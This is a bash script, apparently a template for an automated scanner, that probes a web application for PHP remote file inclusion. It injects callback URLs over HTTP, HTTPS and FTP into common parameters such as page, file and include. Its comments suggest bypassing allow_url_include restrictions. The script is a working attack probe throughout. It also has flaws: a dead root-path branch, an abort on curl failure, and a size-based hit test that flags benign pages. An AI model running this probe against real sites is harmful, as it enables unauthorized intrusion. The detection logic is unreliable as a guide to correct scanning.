#!/bin/bash
# RFI Remote File Inclusion Probe
# 用法: detect_rfi.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:80}"

BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
echo "=== RFI Remote File Inclusion Probe ==="

COMMON_PARAMS="page file include path doc folder view content template image"

QS_PARAM=""
ENDPOINT_PATH_Q="${ENDPOINT#$BASE}"
ENDPOINT_PATH="${ENDPOINT_PATH_Q%%\?*}"
ENDPOINT_QS="${ENDPOINT_PATH_Q#${ENDPOINT_PATH}}"
ENDPOINT_QS="${ENDPOINT_QS#\?}"
if [ -n "$ENDPOINT_QS" ]; then
  QS_PARAM="${ENDPOINT_QS%%=*}"
  [ -n "$QS_PARAM" ] && COMMON_PARAMS="$QS_PARAM $COMMON_PARAMS"
fi

PROBE_COUNT=0

try_rfi() {
  local url="$1"
  local label="$2"
  PROBE_COUNT=$((PROBE_COUNT + 1))
  local result
  result=$(curl -s "$url" --max-time 8 2>/dev/null)
  local ec=$?
  local sz=${#result}

  # 检测 1: 响应体包含回调标记（callback marker）或远程资源特征
  if echo "$result" | grep -qiE '(RFI_CHECK|Remote Include OK|callback_ok)'; then
    echo "[RFI-$PROBE_COUNT][HIT] $label exit=$ec size=${sz}B"
    echo "    URL: $url"
    echo "    Response contains callback marker -- RFI confirmed"
    return 0
  fi
  # 如果响应非空且不包含 PHP 文件未找到错误
  if [ "$sz" -gt 200 ] && ! echo "$result" | grep -qiE '(failed to open stream|No such file|Warning.*include)'; then
    echo "[RFI-$PROBE_COUNT][HIT] $label exit=$ec size=${sz}B (remote-like response)"
    echo "    URL: $url"
    return 0
  fi

  # 检测 2: PHP 错误信息揭示 RFI 可能性
  if echo "$result" | grep -qi 'allow_url_include'; then
    echo "[RFI-$PROBE_COUNT][INFO] $label exit=$ec size=${sz}B"
    echo "    allow_url_include 相关错误，RFI 可能被限制但可尝试绕过"
    echo "$result" | grep -i 'allow_url_include' | head -3
    return 0
  fi

  # 检测 3: URL 被包含但解析失败
  if echo "$result" | grep -qiE '(failed to open stream.*http|No such file.*http)'; then
    echo "[RFI-$PROBE_COUNT][PARTIAL] $label exit=$ec size=${sz}B"
    echo "    PHP 尝试打开远程 URL 但失败，RFI 向量存在"
    return 0
  fi

  echo "[RFI-$PROBE_COUNT][MISS] $label exit=$ec size=${sz}B"
  echo "    URL: $url"
  return 1
}

# Layer 1: 标准 HTTP RFI 测试
echo "--- RFI Layer 1: HTTP remote inclusion ---"
RFI_CALLBACK="{rfi_callback_url}"
if [ "$RFI_CALLBACK" = "{rfi_callback_url}" ] || [ -z "$RFI_CALLBACK" ]; then
  RFI_CALLBACK="http://127.0.0.1:8080/rfi_ping"
  echo "[INFO] 未配置 rfi_callback_url，使用 localhost 回环测试: $RFI_CALLBACK"
fi
for mount in "/" "$ENDPOINT_PATH"; do
  [ -z "$mount" ] || [ "$mount" = "/" ] && continue
  for param in $COMMON_PARAMS; do
    if [ "$mount" = "/" ]; then
      URL="$BASE/?$param=$RFI_CALLBACK"
    else
      URL="$BASE${mount}\?$param=$RFI_CALLBACK"
    fi
    if try_rfi "$URL" "HTTP mount=$mount param=$param"; then
      echo "RFI_FOUND:$param:http"
      echo "{\"event\":\"rfi_param_found\",\"payload\":{\"param\":\"$param\",\"scheme\":\"http\",\"confirmed\":true}}"
      exit 0
    fi
  done
done

# Layer 2: HTTPS 测试
echo "--- RFI Layer 2: HTTPS remote inclusion ---"
RFI_CALLBACK_HTTPS="{rfi_callback_url_https}"
if [ "$RFI_CALLBACK_HTTPS" = "{rfi_callback_url_https}" ] || [ -z "$RFI_CALLBACK_HTTPS" ]; then
  RFI_CALLBACK_HTTPS="$RFI_CALLBACK"
  echo "$RFI_CALLBACK_HTTPS" | grep -q '^https://' || RFI_CALLBACK_HTTPS="https://127.0.0.1:8443/rfi_ping"
fi
for param in $COMMON_PARAMS; do
  URL="$BASE/?$param=$RFI_CALLBACK_HTTPS"
  if try_rfi "$URL" "HTTPS param=$param"; then
    echo "RFI_FOUND:$param:https"
    exit 0
  fi
done

# Layer 3: FTP 等其他协议探测
echo "--- RFI Layer 3: Alternative protocols ---"
for param in page file include; do
  URL="$BASE/?$param=ftp://127.0.0.1:21/"
  if try_rfi "$URL" "FTP param=$param"; then
    echo "RFI_FOUND:$param:ftp"
    exit 0
  fi
done

echo "[INFO] RFI 探测总数: $PROBE_COUNT"
echo "RFI_NOT_FOUND"
